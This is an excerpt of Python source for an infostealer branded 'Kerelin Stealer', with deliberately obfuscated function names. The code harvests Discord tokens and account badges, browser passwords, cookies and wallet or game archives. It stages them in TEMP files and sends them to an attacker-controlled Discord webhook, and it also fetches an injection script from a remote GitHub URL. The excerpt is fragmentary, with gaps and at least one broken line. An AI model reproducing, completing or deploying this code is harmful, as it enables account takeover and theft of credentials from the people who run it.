...
wh00k = "WEBHOOK HERE"
inj_url = "https://raw.githubusercontent.com/wexnhiumsantana/index/main/index.js"
...
def G3tUHQFr13ndS(t0k3n):
    b4dg3List =  [
        ...
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:1150045020087386192> "},
...
def upl05dT4k31(t0k3n, path):
    ...
    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/1189671439247364197/1206025422794526820/xd.jpg?ex=65da81b3&is=65c80cb3&hm=68191d852605a47d9dea5fe4b297ed9b7516fd5151d6619fcf9ab6cf08ecf569&"
    else:
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": "Kerelin Stealer | https://t.me/kerelinx",
                "icon_url": "https://cdn.discordapp.com/attachments/1192183383531471109/1206219306569048084/xd.jpg?ex=65db3645&is=65c8c145&hm=9b617e6fe6e6de1ffb98c5125568b41bc3feead4ef58b8a01c53a124473160fd&"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://cdn.discordapp.com/attachments/1192183383531471109/1206219306569048084/xd.jpg?ex=65db3645&is=65c8c145&hm=9b617e6fe6e6de1ffb98c5125568b41bc3feead4ef58b8a01c53a124473160fd&",
        "username": "Kerelin Stealer",
        "attachments": []
        }
...
def upload(name, link):
    ...
    if name == "kerelincookie":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = R4f0rm3t(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()} @here",
            "embeds": [
                {
                    "title": "Kerelin | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [Kerelin-Cookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Kerelin Stealer | https://t.me/kerelinx",
                        "icon_url": "https://cdn.discordapp.com/attachments/1189671439247364197/1206025422794526820/xd.jpg?ex=65da81b3&is=65c80cb3&hm=68191d852605a47d9dea5fe4b297ed9b7516fd5151d6619fcf9ab6cf08ecf569&"
                    }
                }
            ],
            "username": "Kerelin Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1189671439247364197/1206025422794526820/xd.jpg?ex=65da81b3&is=65c80cb3&hm=68191d852605a47d9dea5fe4b297ed9b7516fd5151d6619fcf9ab6cf08ecf569&",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "kerelinpassword":
        ...
        data = {
            "content": f"{globalInfo()} @here @everyone",
            "embeds": [
                {
                    "title": "Kerelin | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [Kerelin-Password.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Kerelin Stealer | https://t.me/kerelinx ",
                        "icon_url": "https://cdn.discordapp.com/attachments/1189671439247364197/1206025422794526820/xd.jpg?ex=65da81b3&is=65c80cb3&hm=68191d852605a47d9dea5fe4b297ed9b7516fd5151d6619fcf9ab6cf08ecf569&"
...
def wr1tef0rf1l3(data, name):
    path = os.getenv("TEMP") + f"\kerelin{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--KERELİN STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")
...
def getP4ssw(path, arg):
    ...
    tempfold = temp + "kerelin" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
...
def GatherZips(paths1, paths2, paths3):
    ...
    data = {
        "content": globalInfo() @everyone @here,
        "embeds": [
            {
            "title": "Kerelin Zips",
            "description": f"{wal}\n{ga}\n{ot}",
...
def GatherAll():
    ...
    for file in ["kerelinpassword.txt", "kerelincookie.txt"]: 
